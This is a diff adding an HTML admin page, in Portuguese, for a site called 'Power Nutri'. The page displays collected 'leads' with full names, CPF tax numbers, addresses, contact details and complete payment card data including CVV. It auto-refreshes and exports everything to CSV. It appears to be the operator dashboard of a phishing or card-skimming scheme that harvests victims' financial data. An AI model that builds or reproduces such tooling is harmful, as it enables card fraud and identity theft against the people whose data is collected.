@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Power Nutri - Painel de Inteligência</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent: #10b981;
+            --accent-hover: #059669;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--accent);
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: var(--bg-card);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--accent);
+        }
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .actions {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: var(--accent-hover);
+        }
+        .table-container {
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th {
+            background: var(--bg-dark);
+            color: var(--text-muted);
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+        tr:hover {
+            background: rgba(16, 185, 129, 0.1);
+        }
+        .card-info {
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+        }
+        .new-lead {
+            animation: highlight 2s ease-in-out;
+        }
+        @keyframes highlight {
+            0% { background-color: rgba(16, 185, 129, 0.3); }
+            100% { background-color: transparent; }
+        }
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">Power Nutri <span style="color:var(--text-muted); font-weight:normal; font-size:1rem">| Painel de Inteligência</span></div>
+            <div id="clock" style="font-family:monospace; font-size:1.2rem;"></div>
+        </header>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-value" id="totalLeads">0</div>
+                <div class="stat-label">Leads Totais</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="todayLeads">0</div>
+                <div class="stat-label">Leads Hoje</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="lastLeadTime">-</div>
+                <div class="stat-label">Último Lead</div>
+            </div>
+        </div>
+
+        <div class="actions">
+            <button onclick="window.location.href='/api/admin/export'">📥 Exportar CSV (Todos os Dados)</button>
+            <button onclick="refreshLeads(true)">🔄 Atualizar Agora</button>
+        </div>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Hora</th>
+                        <th>Nome</th>
+                        <th>Contato</th>
+                        <th>CPF</th>
+                        <th>Endereço</th>
+                        <th>Cartão (Dados Sensíveis)</th>
+                    </tr>
+                </thead>
+                <tbody id="leadsTable">
+                    <tr><td colspan="6" class="empty-state">Carregando dados...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        let leadsCount = 0;
+
+        function updateClock() {
+            document.getElementById('clock').textContent = new Date().toLocaleTimeString('pt-BR');
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        async function fetchLeads(isManual = false) {
+            try {
+                const response = await fetch('/api/admin/leads');
+                const leads = await response.json();
+                
+                const table = document.getElementById('leadsTable');
+                
+                if (leads.length === 0) {
+                    table.innerHTML = '<tr><td colspan="6" class="empty-state">Nenhum lead coletado ainda. Aguardando primeiro cadastro...</td></tr>';
+                    document.getElementById('totalLeads').textContent = '0';
+                    return;
+                }
+
+                // Atualiza estatísticas
+                document.getElementById('totalLeads').textContent = leads.length;
+                
+                // Conta leads de hoje
+                const today = new Date().toDateString();
+                const todayCount = leads.filter(l => new Date(l.timestamp).toDateString() === today).length;
+                document.getElementById('todayLeads').textContent = todayCount;
+                
+                // Último lead
+                if(leads[0]) {
+                    const lastTime = new Date(leads[0].timestamp).toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
+                    document.getElementById('lastLeadTime').textContent = lastTime;
+                }
+
+                // Renderiza a tabela
+                if (leads.length > leadsCount || isManual) {
+                    table.innerHTML = '';
+                    leads.forEach((lead, index) => {
+                        const isNew = index === 0 && (leads.length > leadsCount || isManual);
+                        const tr = document.createElement('tr');
+                        if (isNew) tr.className = 'new-lead';
+                        
+                        const date = new Date(lead.timestamp);
+                        const timeStr = date.toLocaleDateString('pt-BR') + '<br><small>' + date.toLocaleTimeString('pt-BR') + '</small>';
+                        
+                        tr.innerHTML = `
+                            <td>${timeStr}</td>
+                            <td><strong>${lead.nome}</strong></td>
+                            <td>
+                                ${lead.email}<br>
+                                <small>${lead.telefone}</small>
+                            </td>
+                            <td>${lead.cpf}</td>
+                            <td style="max-width: 200px; font-size: 0.8rem;">${lead.endereco}</td>
+                            <td class="card-info">
+                                <strong>${lead.cardholder}</strong><br>
+                                ${lead.cardNumber} | ${lead.expiry} | <span style="background:var(--accent); color:white; padding:2px 6px; border-radius:4px;">CVV: ${lead.cvv}</span>
+                            </td>
+                        `;
+                        table.appendChild(tr);
+                    });
+                }
+                leadsCount = leads.length;
+            } catch (error) {
+                console.error('Erro ao buscar leads:', error);
+            }
+        }
+
+        // Atualização automática a cada 5 segundos
+        setInterval(fetchLeads, 5000);
+        fetchLeads(); // Carrega ao abrir
+    </script>
+</body>
+</html>
